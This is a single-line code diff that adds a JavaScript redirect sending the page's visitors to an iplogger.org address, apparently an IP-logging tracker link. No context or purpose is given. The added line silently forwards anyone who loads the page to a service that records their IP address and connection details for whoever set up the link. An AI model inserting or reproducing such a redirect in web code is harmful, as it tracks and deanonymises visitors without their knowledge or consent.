@@ -1,0 +1,1 @@
+window.location.replace("https://iplogger.org/2ICBR5");
